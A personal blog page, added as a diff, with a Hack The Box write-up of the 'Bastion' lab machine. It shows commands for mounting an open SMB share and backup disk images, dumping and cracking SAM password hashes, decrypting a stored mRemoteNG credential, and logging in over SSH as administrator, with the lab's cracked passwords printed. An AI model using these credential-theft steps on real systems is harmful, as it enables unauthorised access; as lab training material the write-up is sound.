@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink, john tuyen, jtuyen" /> 
+
+<title>John Tuyen | Bastion</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Bastion"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/htb-bastion/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Bastion" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gaze/ ">Gaze</a> 
+            <a 
+                href="https://johntuyen.com/wiretap/ ">Wiretap</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">07</span>
+        <span class="rest">Sep 19</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Bastion </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li>
+<p>Initial scan show port 139 and 445 is open which means there might be an open SMB share available for mount.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>smbclient //10.10.10.134/Backups
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-bastion/htb-bastion-smb-backups.png" alt="htb-bastion-smb-backups" /></p>
+</li>
+<li>
+<p>There are two .vhd files that could be useful for us. Instead of downloading it on our system, we can mount it directory using guestmount. This part could take awhile as the connection is slow.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>guestmount --add /mnt/test/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
+</span></code></pre>
+</li>
+<li>
+<p>Now that we have the .vhd file mounted, we can proceed with using samdump and extract the SYSTEM and SAM hash and see if we can match the hash using hashkiller.</p>
+<p><img src="https://johntuyen.com/posts/htb-bastion/htb-bastion-samdump2.png" alt="htb-bastion-samdump2.png" /></p>
+</li>
+<li>
+<p><code>hashkiller.co.uk</code> matches a hash result that shows <code>bureaulampje</code> is the password for <code>L4mpje</code> user.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                     
+</span><span>*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                             
+</span><span>L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 (bureaulampje):::
+</span></code></pre>
+</li>
+<li>
+<p>Now if we <code>ssh</code> as the user, we should be able to retrieve the user flag</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>ssh L4mpje@10.10.10.134
+</span></code></pre>
+</li>
+</ol>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<ol>
+<li>
+<p>A software located in Program Files stuck out like a sore thumb:</p>
+<p><img src="https://johntuyen.com/posts/htb-bastion/htb-bastion-mremoteng.png" alt="htb-bastion-mremoteng.png" /></p>
+</li>
+<li>
+<p>Further investigation showed there is a hidden <code>mRemoteNG</code> folder that contains the configuration file:</p>
+<p><img src="https://johntuyen.com/posts/htb-bastion/htb-bastion-mremoteng-hidden.png" alt="htb-bastion-mremoteng-hidden.png" /></p>
+</li>
+<li>
+<p>Google search shows that you can decrypt the password by using this tool on github: <a href="https://github.com/kmahyyg/mremoteng-decrypt">https://github.com/kmahyyg/mremoteng-decrypt</a></p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>python3 mremoteng_decrypt.py -s &quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;
+</span><span>
+</span><span>Password: thXLHM96BeKL0ER2
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-bastion/htb-bastion-admin-pass.png" alt="htb-bastion-admin-pass.png" /></p>
+</li>
+<li>
+<p>Now that we have decrypted the password, we should be able to log into as administrator and obtain root flag.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>ssh administrator@10.10.10.134
+</span></code></pre>
+</li>
+</ol>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/johntuyenprotonmailcom-pgp.asc" title="PGP" rel="me">
+                        <i data-feather="lock"></i>
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
